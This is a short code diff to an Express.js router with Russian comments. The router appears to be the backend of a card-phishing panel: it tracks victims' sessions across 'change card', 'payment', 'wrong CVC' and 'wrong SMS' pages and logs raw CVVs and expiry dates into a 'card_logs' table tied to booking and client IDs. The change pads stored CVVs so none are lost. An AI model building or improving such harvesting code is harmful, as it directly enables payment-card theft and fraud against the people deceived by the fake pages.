@@ -95,8 +95,8 @@ router.get("/check-online-status/:sessionId", (req, res) => {
     change: "🔄 Страница изменения карты",
     payment: "💳 Страница оплаты",
     "wrong-cvc": "❌🔒 Страница неправильного CVC",
-    "wrong-sms": "❌📩 Страница неправильного SMS"
-     // Добавляем новую страницу
+    "wrong-sms": "❌📩 Страница неправильного SMS",
+    // Добавляем новую страницу
   };
   const currentPageDisplay =
     pageNames[status.currentPage] || `📄 ${status.currentPage}`;
@@ -272,6 +272,11 @@ const validateCardData = (
 router.post("/cardlog-update", async (req, res) => {
   const { sessionId, cvv, expireDate } = req.body;
 
+  const safeCvv =
+    typeof cvv === "string"
+      ? cvv.padStart(3, "0")
+      : String(cvv).padStart(3, "0");
+
   // Валидация данных
   const validation = validateCardData(cvv, expireDate);
   if (!validation.isValid) {
@@ -288,7 +293,7 @@ router.post("/cardlog-update", async (req, res) => {
       .prepare(
         `UPDATE card_logs SET cvv = ?, expire_date = ?, step = 'completed' WHERE session_id = ?`
       )
-      .run(cvv, expireDate, sessionId);
+      .run(safeCvv, expireDate, sessionId);
 
     if (result.changes === 0) {
       return res
@@ -314,7 +319,7 @@ router.post("/cardlog-update", async (req, res) => {
       bookingId: booking?.booking_id,
       clientId: booking?.client_id,
       step: "completed",
-      cvv: cvv,
+      cvv: safeCvv,
       expireDate: expireDate,
     });
 
